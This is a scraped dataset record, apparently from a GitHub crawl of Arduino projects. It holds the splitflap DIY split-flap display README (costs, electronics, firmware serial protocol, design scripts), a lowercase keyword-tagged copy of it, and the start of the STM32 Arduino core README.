drill info can be produced by running electronics/scripts/generate_pdf.py file.kicad_pcb.\nGerber files for fabrication can be exported by running electronics/scripts/generate_gerber.py file.kicad_pcb. This generates gerber files and an Excellon drill file with Seeed Studio's naming conventions and produces a .zip which can be sent for fabrication.\nEESchema isn't easily scriptable, so to export the schematic electronics/scripts/export_schematic.py starts an X Virtual Frame Buffer (Xvfb) and open the eeschema GUI within that virtual display, and then send a series of hardcoded key presses via xdotool to interact with the GUI and click through the dialogs. This is very fragile but seems to work ok for now. For additional details, see this blog post: Using UI automation to export KiCad schematics.\nLicense\nI'd love to hear your thoughts and questions about this project, and happy to incorporate any feedback you might have into these designs! Please feel free (and encouraged) to open GitHub issues, email me directly, reach out on Twitter, and get involved in the open source development and let's keep chatting and building together!\nThis project is licensed under Apache v2 (see LICENSE.txt).\nCopyright 2015-2021 Scott Bezek and the splitflap contributors\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\nhttp://www.apache.org/licenses/LICENSE-2.0\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.", "link": "https://github.com/scottbez1/splitflap", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "diy split-flap display\nthis is a diy split-flap display. prototype four-character display: video.\nthe goal is to make a low-cost display that's easy to fabricate at home in small/single quantities (e.g. custom materials can be ordered from ponoko or similar, and other hardware is generally available).\nyou can view an interactive 3d model of the design on the project website.\nthe splitflap community slack group is the best place to keep up with the latest changes or ask questions about the project!\nwant to help support development or just say \"thanks\"? consider a one-time or monthly sponsorship:\n\u2764\ufe0f sponsor scottbez1 on github\nusing this project in a commercial setting or for paid client work? go right ahead - it's open source (just make sure to follow the terms of the apache license)! i would, however, ask that you consider sponsoring the project. i've been developing and maintaining this project in my free time for over 6 years, and i'd love to continue working on it. sponsorships allow me to pay for prototypes and development tools that make this project possible. unlike pure software projects, every iteration has real hardware costs; sponsorships allow me to keep iterating and improving the project faster. thank you!\ncurrent status\nyou can download the latest stable release from the official 'releases' page.\nreleases have been tested and used to produce working units, but as this is a continuously evolving open-source project, there may always be minor issues and/or incomplete documentation from time to time.\ncomponent status notes\nenclosure/mechanics stable\nclassic controller electronics stable\nfirmware stable\ncontrol software example stable example python code for driving the display is in the software directory\n\ud83d\udca1 there's a new electronics system, called the chainlink system (more on this below), which makes assembly easier and supports larger displays (100+ modules), using an esp32 for the controller. it's a stable design and will become the recommended electronics in the near future (q1 2022), but documentation is still in progress so you may hit more bumps in the road for now.\nhere's a video of a large 108-module display powered by 18 chainlink driver boards and a chainlink base:\ni'd love to hear your thoughts and questions about this project, and happy to incorporate any feedback you might have into these designs! please feel free (and encouraged) to open github issues, email me directly, reach out on twitter, and get involved in the open source development and let's keep chatting and building together!\nbuild your own\nordering guide (v0.5/0.6/0.7)\nlatest stable release\nassembly instructions (v0.5/0.6/0.7)\ntable of contents\nrough cost breakdown\nhousing\nhardware & consumables\nflaps\npcb\nelectronics & motor\ndesign overview\nmechanical\nelectronics\nmodule electronics\nclassic controller electronics\nchainlink electronics\nchainlink driver\nchainlink buddy [t-display]\nchainlink buddy [breadboard]\nchainlink base\nmiscellaneous tools\nflaps and fonts\n3d printed tools\nchainlink driver tester\ncode\nfirmware\ncomputer control software\ncontributing/modifying\n3d design\nelectronics design\nrough cost breakdown\nthis is an incomplete list of supplies needed to build a split-flap display module to get a rough sense of the overall cost. many items have minimum package sizes, so per-unit-prices will be higher when building fewer units due to the need to buy more items than will actually be used.\neach section includes a subtotal based on building 4 modules, which is a relatively economical compromise where shipping costs and moqs no longer dominate the cost.\noverall, expect to spend somewhere around $200 to $250 for 4 standard 40-character modules.\nhousing\nthe laser-cut housing/mechanics can be ordered from ponoko (high quality, us-based) or elecrow. or you can cut it yourself if you have a laser-cutter capable of cutting 3mm mdf or acrylic.\nponoko\nprice units per order name supplier notes\n$52.97 4 4x mdf 3 mm, laser-cut, shipping ponoko\n$14 n/a setup fee ponoko\ntotal: $16.75 per unit (at 4 units)\nelecrow\nprice units per order name supplier notes\n$15 5 wood laser cut, 3 mm, no engraving elecrow\n$22 5 shipping elecrow\ntotal: $9.25 per unit (at 4 units)\nhardware & consumables\nprice units per order name supplier notes\n$5-10 4 50 pack m4-10 button-head hex screw many options 11 screws needed per unit\n$5-10 4 50 pack m4 hex nut many options 11 nuts needed per unit\ntotal: $2.50-5.00 per unit (at 4 units)\nflaps\nthere are two options for flaps: hand-cut or professionally die-cut.\nhand-cut (option 1)\neach card needs to be cut in half and then have two pieces punched out of either side. each display unit requires 40 flaps, or 20 cards per unit. 100 cards is enough for 5 units in theory, but 4 in practice because there are no spares for mistakes.\nprice units per order name supplier notes\n$14 4 blank white cr80 cards amazon one package ($14) covers 4 units\n$9.17 n/a badge slot punch -----> tool !!!  amazon one-time, up front cost\n$7 2 vinyl letter stickers amazon one package ($7) covers 2 units\ntotal: $7.00 per unit (at 4 units) + $9.17 upfront for the punch -----> tool !!!  + a lot of time and effort\ndie-cut (option 2)\nthese professional die-cut flaps are manufactured specifically for this project (no manual cutting/punching required) and come in both white and matte black. sold by bezek labs, so proceeds help support continued development on this project.\nprice units per order name supplier notes\n$53 4 die-cut flaps etsy - bezeklabs one package ($45 + shipping) covers 4 units\n$7 2 vinyl letter stickers amazon one package ($7) covers 2 units\ntotal: $16.75 per unit (at 4 units)\npcb\ncircuit boards are available either in small quantities from the bezek labs store, or in bulk from pcb manufacturers such as seeedstudio.\netsy - bezeklabs\nprice units per order name supplier notes\n$3.99 4 controller pcb etsy - bezeklabs one pcb supports 4 units\n$2.99 4 sensor pcb set etsy - bezeklabs 4 pcbs per package\ntotal: $1.75 per unit (at 4 units)\nseeedstudio (bulk)\nprice units per order name supplier notes\n$5 80 controller pcb seeedstudio 20 pcbs per order, 4 units per pcb\n$5 200 sensor pcb seeedstudio\n$15 shipping combined shipping for both items\ntotal: $6.25 per unit (at 4 units), or as low as $0.32 per unit (at 80 units)\nelectronics & motor\nprice units per order name supplier notes\n$14.00 4 controller board components digikey one pcb supports 4 units\n$2.00 1 sensor board components digikey\n$2.00 1 28byj-48 motor (12v preferred) aliexpress see motor notes for details\n$10.00 10 3-pin servo cable (male to male) amazon or aliexpress\n$11.00 up to 12 12v power supply amazon one per display (up to 12 units)\ntotal: $5.00 per unit (motor, sensor components, cable) + $14.00 per 4 units (controller components) + $11.00 per display (up to 12 units)\nyou can find a more detailed breakout of electronics' bill of materials (bom) in the ordering instructions.\ndesign overview\nmechanical\nthe mechanical/structural components are made from laser-cut 3mm mdf or acrylic, and held together with m4 bolts and nuts. the design is parametric and built using openscad. see below for more info on rendering/modifying the design.\nlatest auto-generated (untested!) artifacts\u26a0\ufe0f:\nfor ponoko 3mm mdf (1x svg, 4x svg)\nfor ponoko 3mm acrylic (1x svg, 4x svg,)\nfor generic material (0.18mm kerf correction) (1x svg)\nfor elecrow 3mm wood (1x zipped pdf, note that elecrow orders are automatically 5x)\nfor elecrow 3mm acrylic (1x zipped pdf, note that elecrow orders are automatically 5x)\n\u26a0\ufe0ffor tested/stable/recommended artifacts, use the latest release instead\nelectronics\nthe current recommended approach is the classic controller board, which plugs into an arduino uno as a shield and can control up to 4 modules. up to 2 additional classic controller boards can be chained using ribbon cables for a total of up to 12 modules controlled by a single arduino uno.\nfor small displays (up to 3 modules), you can skip the custom controller boards and use off-the-shelf uln2003a driver modules plugged into an arduino uno. this is partially documented in the wiki but may require some additional tinkering to get it to work. help wanted: if you'd like to help improve these instructions, please reach out in the slack group, thanks!\na new electronics design (chainlink) is now available, which allows for larger-scale displays by chaining more modules together and uses a more powerful microcontroller (esp32). this also adds the possibility of wifi and ble control, though this isn't currently implemented in firmware yet. for the latest on the chainlink system, join the slack group.\nmodule electronics\neach module needs a hall-effect sensor for start-up calibration and fault monitoring. this can be mounted in different ways but the recommended approach is to use a small pcb, with an ah3391q (or similar) sensor and connector, which mounts to the side of the module with a single screw and can easily be adjusted for precise calibration.\nthese boards are small (about 16mm x 16 mm) and the designs are available as a panelized pcb, which can be snapped apart. the panelization is configurable and is optimized for production at low-cost pcb fabricators like seeedstudio, jlcpcb, or pcbway.\nlatest auto-generated (untested!) artifacts\u26a0\ufe0f:\nsensor pcb, single (gerbers / pdf)\nsensor pcb, panelized (gerbers / pdf)\n\u26a0\ufe0ffor tested/stable/recommended artifacts, use the latest release instead\nclassic controller electronics\nthe classic driver board is designed to plug into an arduino like a shield, and can control 4 stepper motors. up to 3 driver boards can be chained together, for up to 12 modules controlled by a single arduino. the designs for the controller can be found under electronics/splitflap.pro (kicad 4 project). nearly everything is a through-hole component rather than smd, so it's very easy to hand-solder.\nthe driver uses 2 mic5842 low-side shift-register drivers, with built-in transient-suppression diodes, to control the motors, and a 74hc165 shift register to read from 4 hall-effect magnetic home position sensors. there are optional ws2812b rgb leds which can be used to indicate the status of each of the 4 channels.\nthe pcb layout is 10cm x 5cm which makes it fairly cheap to produce using a low-cost pcb manufacturer (e.g. seeed studio).\nlatest auto-generated (untested!) artifacts\u26a0\ufe0f:\nbill of materials (csv, interactive)\npcb (gerbers / pdf)\npanelized pcb (gerbers / pdf)\n\u26a0\ufe0ffor tested/stable/recommended artifacts, use the latest release instead\nchainlink electronics\nthe chainlink system is an upcoming alternative to the classic controller/driver, which is designed to be easier and cheaper to build, especially in higher quantities due to its simplified bom and surface-mount components. it's also designed to support longer chains of driver boards to control large displays (think 100+ split-flap modules).\nchainlink is stable and will become the recommended electronics system in the near future, but documentation is still in progress so there is not an easy guide for ordering/building it yet.\nthe chainlink system requires 2 core elements:\none or more chainlink driver board accepts data and power and each driver connects to 6 individual split-flap modules. chainlink driver boards can be chained together to construct a large display.\nsome kind of esp32 microcontroller board. there are a few options:\nfor small/medium displays, one of the chainlink buddy boards are recommended\nchainlink buddy [t-display] holds a lilygo t-display esp32 module which includes a built-in lcd and 2 buttons\nchainlink buddy [breadboard] makes it easy to connect a chainlink driver to a breadboard for prototyping, though you can also easily connect a chainlink driver to a breadboard with a few dupont wires.\nfor large displays, the chainlink base provides a number of advanced features: central power management/distribution and fault monitoring, uart and rs-485 connections, configuration switches, and status leds.\nchainlink driver\nkey features (vs classic controller):\ncontrols 6 split-flap modules per board instead of just 4 - fewer pcbs means lower cost and less wiring\nlonger pcb (200mm) gets connectors closer to each module so wires have more slack\nprimarily smd and all components (except the pin headers and motor connectors) are available in jlcpcb's parts library for easy smd/tht assembly\nclock and latch lines are buffered on each board with a 74hc125 to support longer chains\nneopixels replaced by shift-register-driven single-color led per module (one fewer data line needed in the chain, lower current draw, and 3.3v io friendly)\n2 bits of loopback (connecting 2 spare output bits on output shift registers to 2 spare inputs) allows the controller to validate data integrity up and down the whole chain\ntpl7407l mosfet low-side drivers instead of uln2003a/mic5842 (lower on-resistance means less voltage drop in the driver = more torque, less waste heat, and less total current consumption) due to the chip shortage, tpl7407l ics are not currently available and will likely not be available again until mid-2022, so the auto-generated jlc component/bom files below currently use uln2003a darlington drivers as a suitable drop-in replacement.\nmodule order goes from right-to-left since this is intended to be installed and accessed from behind the modules\nchainlink driver boards are available mostly-assembled in the bezek labs store, and come with the additional connectors and ribbon cables you'll need. purchases support continued development of this project.\nmore information on building and using chainlink drivers is available in the chainlink driver user guide.\nor if you'd like to order these directly from a fab, this design is optimized for assembly at jlcpcb, and files are automatically generated for ordering assembled pcbs there. or if you wish to assemble this board yourself instead of paying for assembly, you can view the interactive bom/placement tool\ndepending on available stock at jlcpcb, you may need to manually modify the bom file to use alternative components, or regenerate the files yourself using export_jlcpcb.py and specifying one or more lcsc_alt_* field names to use a pre-selected alternative part number. see the schematic for available pre-selected alternatives (check the symbol's properties/fields).\nlatest auto-generated (untested!) artifacts\u26a0\ufe0f:\nschematic pdf\npcb overview pdf\npcb gerbers zip\npcb bom (for jlcpcb assembly) csv\npcb cpl (for jlcpcb assembly) csv\npcb bom (for manual assembly) interactive\n\u26a0\ufe0ffor tested/stable/recommended artifacts, use the latest release instead\nchainlink buddy [t-display]\nthe chainlink buddy [t-display] is a convenient way to connect a t-display esp32 board (recommended microcontroller) to a chain of chainlink drivers.\nkey features:\nttgo t-display esp32 module as the controller, which includes usb-c, color ips lcd display and buttons\nextra terminals for every pin of the t-display allow you to connect any other peripherals to the esp32 (the connection to the chainlink driver requires only 4 of the gpios)\noptional barrel jack makes it easy to use a \"wall wart\" ac adapter/power-supply (since the chainlink driver only has screw terminals for power) -- plug in a 12v supply and then run a wire from the onboard screw terminals to the chainlink driver's motor power screw terminals.\noptional 5v regulator allows for powering the esp32 without a usb connection, using the 12v motor power supply\nchainlink buddy [t-display] boards are available in the bezek labs store, and come with the additional connectors you'll need. purchases support continued development of this project.\nlatest auto-generated (untested!) artifacts\u26a0\ufe0f:\nschematic pdf\npcb (gerbers / pdf)\npanelized pcb (gerbers / pdf)\npcb bom (for manual assembly) interactive\n\u26a0\ufe0ffor tested/stable/recommended artifacts, use the latest release instead\nchainlink buddy [breadboard]\nthe chainlink buddy [breadboard] makes it easy to connect a chainlink driver to a breadboard for prototyping. you could use 5 dupont wires and have a messy rats nest, or you could use a single ribbon cable and this slick breakout board.\nchainlink buddy [breadboard] boards are available in the bezek labs store, and come with the additional connectors you'll need. purchases support continued development of this project.\nlatest auto-generated (untested!) artifacts\u26a0\ufe0f:\nschematic pdf\npcb (gerbers / pdf)\npanelized pcb (gerbers / pdf)\npcb bom (for manual assembly) interactive\n\u26a0\ufe0ffor tested/stable/recommended artifacts, use the latest release instead\nchainlink base\nthis is currently under very active development. it has been tested and appears to work, but is not yet recommended for general use. firmware support is in progress.\nthe chainlink base pcb is an optional component of the chainlink system, designed for particularly large displays. it hosts the esp32 and adds additional connectivity options (terminals for uart and rs485 serial) and power distribution (independently-monitored power channels for multiple \"zones\" of driver boards).\ni would generally recommend wiring an esp32 directly rather than using a chainlink base pcb unless you are building a large (50+ module) display.\nkey features:\nttgo t-display esp32 module as the controller, which includes usb-c, color ips lcd display and buttons\noptional master relay output for 12v psu control (5v relay, up to ~500ma coil current)\nfuture firmware will power on the 12v psu after a startup self-test, and power off psu in case of any faults\n5 channels of independently monitored 12v switches for powering groups of chainlink driver boards (6-10a max per channel)\ndepending on the motors you use, each channel may be able to power about 6 chainlink driver boards which is 36 splitflap modules\neach channel includes an automotive fuse holder for additional over-current protection\nina219 and shunt resistor provide high fidelity voltage and current monitoring\nfirmware will power on each channel after a startup self-test, and power off the channel in case of any faults\n3.3v output for powering many chainlink driver boards\nflexible controller input power\nusb power from the t-display works by default, though external power is recommended for larger displays\nregulated 5v can be connected directly to the screw terminals, or\nif you are using an always-on 12v psu without a master relay, you can install a buck module and power the board from 12v using the 7-28v screw terminals\nlatest auto-generated (untested!) artifacts\u26a0\ufe0f:\nschematic pdf\npcb overview pdf\npcb gerbers zip\npcb bom (for manual assembly) interactive\n\u26a0\ufe0fthere are currently no stable releases of this board. once the board design is tested and recommended, a stable release will be created on the releases dashboard\nmiscellaneous tools\nflaps and fonts\nif you'd like to print your own flaps, or cut custom vinyl letter stickers, the project includes a script to generate vector design files that is extremely configurable:\nfont for text (this is further customizable in openscad)\ncharacter-set - which letters/numbers/symbols/colors are included and in what order\nbleed - extends rendering past the borders of the flaps to compensate for slight misalignment of printing and cutting operations\nkeepout areas - option to highlight keepout violations for manual review, automatically clip them, or ignore them\nrendering options:\nsingle-sided - useful for previewing how all letters will look on flaps\nfront/back - for batch duplex printing, generate separate front-side and back-side files (e.g. sign shop printing on a flat sheet of pvc)\nside-by-side - for individual flap printing, each flap's front design is laid out side-by-side with its back design\ntodo: finish documenting this and render some example images...\n3d printed tools\nthe project also includes a number of optional 3d printed designs to make assembly easier. these include:\na flap scoring jig for precisely marking the cut point when splitting cr80 cards\na flap punch jig for aligning the punch when making the pin cutouts on either side of a flap\na flap container for storing and organizing stacks of completed flaps\na sensor pcb holder for storing and protecting soldered sensor boards\nall of these designs are parametric and customizable within openscad. to print them, open up the relevant file in openscad and use file -> export -> export as stl to render the design as an stl file for your slicer.\nchainlink driver tester\nthis is not likely to be useful unless you're planning to manufacture dozens to hundreds of chainlink driver boards, but the chainlink driver tester is a complete testbed for chainlink driver boards as they come assembled by the pcba fabricator.\nthis is currently under very active development.\nkey features:\nttgo t-display (esp32) controller, screen, and buttons for controlling tests and reporting results\npogo-pins for all connectors on the chainlink driver board-under-test (screw terminals, sensor pin headers, and motor connectors)\n12v switch to supply motor power to the board-under-test, with automotive fuse and ina219 voltage/current monitoring (based on the chainlink base channel switch design)\nseparate 3.3v supply for the board-under-test, protected with a polyfuse, should avoid browning out the tester's mcu in case of 3.3v short-circuits\nmotor and sensor connections are broken out from the pogo-pins for a full closed-loop hardware test\nscrew terminals to chain another chainlink driver (not under test) to validate that chained outputs work on the board-under-test\nmcp23017 gpio expander with 8 gpio pins exposed via headers for future expansion inputs\nlarge cutout allows a barcode scanner or camera to be aimed at the bottom of the board-under-test for tracking serial numbers.\nbuzzer option for audible pass/fail feedback\nlatest auto-generated (untested!) artifacts\u26a0\ufe0f:\nschematic pdf\npcb overview pdf\npcb gerbers zip\npcb bom (for manual assembly) interactive\n\u26a0\ufe0fthere are currently no stable releases of this board, and there may never be as it is a niche production tool, not an end product. if you need this tool, you are likely actively involved in development and should understand the revision history and current status of development enough to make an informed decision about which revision(s) to use.\ncode\nfirmware\nthe driver firmware is written using arduino and is available at arduino/splitflap/splitflap/splitflap.ino.\nthe firmware implements a closed-loop controller that accepts letters as input over usb serial and drives the stepper motors using a precomputed acceleration ramp for smooth control. the firmware automatically calibrates the spool position at startup, using the hall-effect magnetic sensor, and will automatically recalibrate itself if it ever detects that the spool position has gotten out of sync. if a commanded rotation is expected to bring the spool past the \"home\" position, it will confirm that the sensor is triggered neither too early nor too late; otherwise it will search for the \"home\" position to get in sync before continuing to the desired letter.\ncomputer control software\nthe display can be controlled by a computer connected to the arduino over usb serial. a basic python library for interfacing with the arduino and a demo application that displays random words can be found in the software directory.\ncommands to the display are sent in a basic plain-text format, and messages from the display are single-line json objects, always with a type entry describing which type of message it is.\nwhen the arduino starts up, it sends an initialization message that looks like:\n{\"type\":\"init\", \"num_modules\":4}\nthe display will automatically calibrate all modules, and when complete it will send a status update message:\n{\n\"type\":\"status\",\n\"modules\":[\n{\"state\":\"normal\", \"flap\":\" \", \"count_missed_home\":0, \"count_unexpected_home\":0},\n{\"state\":\"sensor_error\", \"flap\":\"e\", \"count_missed_home\":0, \"count_unexpected_home\":0},\n{\"state\":\"sensor_error\", \"flap\":\"e\", \"count_missed_home\":0, \"count_unexpected_home\":0},\n{\"state\":\"sensor_error\", \"flap\":\"e\", \"count_missed_home\":0, \"count_unexpected_home\":0}\n]\n}\n(note: this is sent as a single line, but has been reformatted for readability above)\nin this case the arduino was programmed to support 4 modules, but only 1 module is connected, so the other 3 end up in \"sensor_error\" state. more on status updates below.\nat this point you can command the display to show some letters. to do this, send a message to the arduino that looks like this:\n=hiya\\n\nthe = indicates a movement command, followed by any number of letters, followed by a newline. you don't have to send the exact number of modules - if you send fewer letters than modules, only the first n modules will be updated and the remainder won't move. for instance, you could send =a\\n as shorthand to only set the first module (even if there are 12 modules connected). any letters that can't be displayed are considered a no-op for that module.\nwhenever all modules come to a stop, the arduino will send a status update message (just like the one following initialization, shown above). here's what the fields mean in each module's status entry:\nstate - normal indicates it's working as intended, sensor_error indicates the module can't find the home position and has given up trying (it will no longer respond to movement commands until told to recalibrate - see below). panic indicates the firmware detected a programming bug and has gone into failsafe mode (it will no longer respond to movement commands and requires a full reset of the arduino to recover - should never happen).\nflap - which letter is shown by this module\ncount_missed_home - number of times the module expected to pass the home position but failed to detect it. if this is non-zero, it indicates either a flaky sensor or that the motor may have jammed up. the module automatically attempts to recalibrate whenever it misses the home position, so if this number is non-zero and the module is still in the normal state, it means the module successfully recovered from the issue(s). however, if this number keeps going up over continued use, it may indicate a recurrent transient issue that warrants investigation.\ncount_unexpected_home - number of times the module detected the home position when it wasn't supposed to. this is rare, but would indicate a flaky/broken sensor that is tripping at the wrong time. just like with missed home errors, unexpected home errors will cause the module to attempt to recalibrate itself.\nif you want to make all modules recalibrate their home position, send a single @ symbol (no newline follows):\n@\nthis recalibrates all modules, including any that were in the sensor_error state; if recalibration succeeds they will return to the normal state and start responding to movement commands again.\ncontributing/modifying\nlooking to make some modifications or play around with the design on your local machine? jump right in! note that all of the scripts and automation are developed for ubuntu. mac os support is planned, but not currently implemented (but feel free to open a pr if you want to help!).\n3d design\nthe main design file is 3d/splitflap.scad\nyou'll need a recent version of openscad (e.g. 2015-03), which may need to be installed through the ppa: sudo add-apt-repository ppa:openscad/releases\nin general, solid objects such as the enclosure sides or spool components are built from 2d primitives and then extruded to the appropriate thickness for 3d rendering, rather than using 3d primitives. this simplifies the design without losing expressiveness; the perpendicular laser cut beam doesn't allow for cuts that vary in the z dimension anyway.\nnote that while the design is parameterized and many values may be tweaked, there is currently no error checking for invalid parameters or combinations of parameters. please take care to validate the design if you change any parameters. for instance, while most of the design will adjust to a changed num_modules value, certain values may cause some elements to intersect with other elements or protrude beyond their expected dimensions.\nrendering\nlaser-cut vector files\nthe design can be rendered to 2d for laser cutting by running 3d/scripts/generate_2d.py [--panelize <number>], which outputs to 3d/build/laser_parts/combined.svg. the optional --panelize argument allows for rendering a panel of modules in a single svg, for bulk laser-cutting.\ninternally, the design uses a projection_renderer module (3d/projection_renderer.scad), which takes a list of child elements to render, and depending on the render_index renders a single child at a time. it also adds material to each shape to account for the kerf that will be cut away by the laser.\nthe generate_2d.py script interacts with the projection_renderer module by first using it to determine the number of subcomponents to render, then runs openscad to export each component to an svg file. it does some post-processing on the svg output (notably adds \"mm\" to the document dimensions), and then combines all components into the single combined.svg output.\nonce the combined.svg file is generated, you'll want to double-check there aren't any redundant cut lines that are shared by multiple adjacent pieces, to save time/cost when cutting. they should be detected automatically (and highlighted in red in the rendering above), but it doesn't hurt to double-check. in inkscape, select the \"edit paths by nodes\" tool and select an edge to delete - the endpoints should turn blue. then click \"delete segment between two non-endpoint nodes\", and repeat this for all other redundant cut lines.\nanimated gif\nthe design can be rendered to a rotating 3d animated gif (seen above) by running 3d/scripts/generate_gif.py, which outputs to 3d/build/animation/animation.gif\nthe generate_gif.py script runs multiple openscad instances in parallel to render the design from 360 degrees to individual png frames, which are then combined into the final gif animation. as part of building the animation, generate_gif.py renders the design with multiple configurations (opaque enclosure, see-through enclosure, no-enclosure and no flaps) by setting the render_enclosure and render_flaps variables.\nstl models/web viewer\nthe design can be rendered to a series of stl files (one per color used in the model) in order to be displayed in an interactive web-based 3d viewer. similar to the projection_renderer used to render individual components for laser-cutting, the coloredstlexporter detects all the colors used in the model and renders them one-by-one to separate stl files, along with a manifest that maps each stl file to its rgb color. the stl files and manifest are loaded using three.js to display an interactive model on a web site using webgl. see this blog post for more details on how the export and three.js renderer work: openscad rendering tricks, part 3: web viewer.\nelectronics design\nall of the electronics are developed using kicad 5. panelization is provided by kikit and gerber/bom generation is provided by kibot.\nrendering\nthe mechanical and electrical design renderings and links above are automatically updated on every commit with the latest rendering. see this blog post for more details on how that works: automated kicad, openscad rendering using travis ci.\nthe pcb layout can be rendered to an svg or png (seen above) by running electronics/scripts/generate_svg.py file.kicad_pcb. this uses kicad's python scripting api to render several layers to individual svg files, manipulates them to apply color and opacity settings, and then merges them to a single svg. for additional details, see this blog post: scripting kicad pcbnew exports.\nfor reviewing the design, a pdf packet with copper, silkscreen, and drill info can be produced by running electronics/scripts/generate_pdf.py file.kicad_pcb.\ngerber files for fabrication can be exported by running electronics/scripts/generate_gerber.py file.kicad_pcb. this generates gerber files and an excellon drill file with seeed studio's naming conventions and produces a .zip which can be sent for fabrication.\neeschema isn't easily scriptable, so to export the schematic electronics/scripts/export_schematic.py starts an x virtual frame buffer (xvfb) and open the eeschema gui within that virtual display, and then send a series of hardcoded key presses via xdotool to interact with the gui and click through the dialogs. this is very fragile but seems to work ok for now. for additional details, see this blog post: using ui automation to export kicad schematics.\nlicense\ni'd love to hear your thoughts and questions about this project, and happy to incorporate any feedback you might have into these designs! please feel free (and encouraged) to open github issues, email me directly, reach out on twitter, and get involved in the open source development and let's keep chatting and building together!\nthis project is licensed under apache v2 (see license.txt).\ncopyright 2015-2021 scott bezek and the splitflap contributors\nlicensed under the apache license, version 2.0 (the \"license\");\nyou may not use this file except in compliance with the license.\nyou may obtain a copy of the license at\nhttp://www.apache.org/licenses/license-2.0\nunless required by applicable law or agreed to in writing, software\ndistributed under the license is distributed on an \"as is\" basis,\nwithout warranties or conditions of any kind, either express or implied.\nsee the license for the specific language governing permissions and\nlimitations under the license.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000024, "year": null}, {"Unnamed: 0": 2066, "autor": 26, "date": null, "content": "Arduino core support for STM32 based boards\nIntroduction\nGetting Started\nSupported boards\nTroubleshooting\nWiki\nIntroduction\nThis repo adds the support of STM32 MCU in Arduino IDE.\nThis porting is based on:\nSTM32Cube MCU Packages including:\nThe HAL hardware abstraction layer, enabling portability between different STM32 devices via standardized API calls\nThe Low-Layer (LL) APIs, a light-weight, optimized, expert oriented set of APIs designed for both performance and runtime efficiency\nCMSIS device definition for STM32\nCMSIS: Cortex Microcontroller Software Interface Standard (CMSIS) is a vendor-independent hardware abstraction layer for the Cortex\u00ae-M processor series and defines generic tool interfaces. It has been packaged as a module for Arduino IDE: https://github.com/stm32duino/ArduinoModule-CMSIS\nGNU Arm Embedded Toolchain: Arm Embedded GCC compiler, libraries and other GNU tools necessary for bare-metal software development on devices based on the Arm Cortex-M. Packages are provided thanks The xPack GNU Arm Embedded GCC: https://github.com/xpack-dev-tools/arm-none-eabi-gcc-xpack\nGetting Started\nThis repo is available as a package usable with Arduino Boards Manager.\nAdd this link in the \"Additional Boards Managers URLs\" field:\nhttps://github.com/stm32duino/BoardManagerFiles/raw/main/package_stmicroelectronics_index.json\nWarning:\nDefault branch has changed to main.\nSince core release 2.0.0 this link has changed.\nFor full instructions on using the \"Boards Manager\", see the Getting Started page.\nAdvanced user can use the repository to benefit from the latest development. See the Using git repository page.\nUser can add a STM32 based board following this wiki.\nSupported boards\nNucleo 144 boards\nNucleo 64 boards\nNucleo 32 boards\nDiscovery boards\nEval boards\nSTM32MP1 series coprocessor boards\nGeneric STM32F0 boards\nGeneric STM32F1 boards\nGeneric STM32F2 boards\nGeneric STM32F3 boards\nGeneric STM32F4 boards\nGeneric STM32F7 boards\nGeneric STM32G0 boards\nGeneric STM32G4 boards\nGeneric STM32H7 boards\nGeneric STM32L0 boards\nGeneric STM32L1 boards\nGeneric STM32L4 boards\nGeneric STM32L5 boards\nGeneric STM32U5 boards\nGeneric STM32WB boards\nGeneric STM32WL boards\n3D printer boards\nBlues Wireless boards\nElecgator boards\nElectronic Speed Controller boards\nGaratronics boards\nGeneric flight controllers\nLoRa boards\nMidatronics boards\nNucleo 144 boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32F207ZG Nucleo F207ZG 0.2.0\n\ud83d\udc9a STM32F429ZI Nucleo F429ZI 0.1.0\n\ud83d\udc9a STM32F767ZI Nucleo F767ZI 1.4.0\n\ud83d\udc9a STM32F746ZG Nucleo F746ZG 1.9.0\n\ud83d\udc9a STM32F756ZG Nucleo F756ZG 1.9.0\n\ud83d\udc9a STM32L496ZG Nucleo L496ZG 1.3.0\n\ud83d\udc9a STM32L496ZG-P Nucleo L496ZG-P 1.3.0\n\ud83d\udc9a STM32L4R5ZI Nucleo L4R5ZI 1.4.0\n\ud83d\udc9a STM32L4R5ZI-P Nucleo L4R5ZI-P 1.4.0\n\ud83d\udc9a STM32L552ZE-Q Nucleo L552ZE-Q 2.0.0\n\ud83d\udc9a STM32H743ZI Nucleo H743ZI(2) 1.5.0 Nucleo H743ZI2 since 1.6.0\n\ud83d\udc9a STM32U575ZI-Q NUCLEO-U575ZI-Q 2.1.0\nNucleo 64 boards\nStatus Device(s) Name Release Notes\n\ud83d\udc9a STM32F030R8 Nucleo F030R8 0.2.0\n\ud83d\udc9a STM32F070RB Nucleo F070RB 2.0.0\n\ud83d\udc9a STM32F072RB Nucleo F072RB 1.9.0\n\ud83d\udc9a STM32F091RC Nucleo F091RC 0.1.0\n\ud83d\udc9a STM32F103RB Nucleo F103RB 0.2.0\n\ud83d\udc9a STM32F302R8 Nucleo F302R8 1.1.0\n\ud83d\udc9a STM32F303RE Nucleo F303RE 0.1.0\n\ud83d\udc9a STM32F401RE Nucleo F401RE 0.2.1\n\ud83d\udc9a STM32F411RE Nucleo F411RE 0.2.1\n\ud83d\udc9a STM32F446RE Nucleo F446RE 1.1.1\n\ud83d\udc9a STM32G071RB Nucleo G071RB 1.6.0\n\ud83d\udc9a STM32G0B1RE Nucleo G0B1RE 2.1.0\n\ud83d\udc9a STM32G431RB Nucleo G431RB 1.7.0\n\ud83d\udc9a STM32G474RE Nucleo G474RE 1.7.0\n\ud83d\udc9a STM32L010RB Nucleo L010RB 2.1.0\n\ud83d\udc9a STM32L053R8 Nucleo L053R8 0.1.0\n\ud83d\udc9a STM32L073RZ Nucleo L073RZ 1.4.0\n\ud83d\udc9a STM32L152RE Nucleo L152RE 1.0.0\n\ud83d\udc9a STM32L433RC-P Nucleo L433RC-P 1.9.0\n\ud83d\udc9a STM32L452RE Nucleo L452RE 1.5.0\n\ud83d\udc9a STM32L452RE-P Nucleo L452RE-P 1.8.0\n\ud83d\udc9a STM32L476RG Nucleo L476RG 0.1.0\n\ud83d\udc9a STM32WB55RG\nSTM32WB55CG 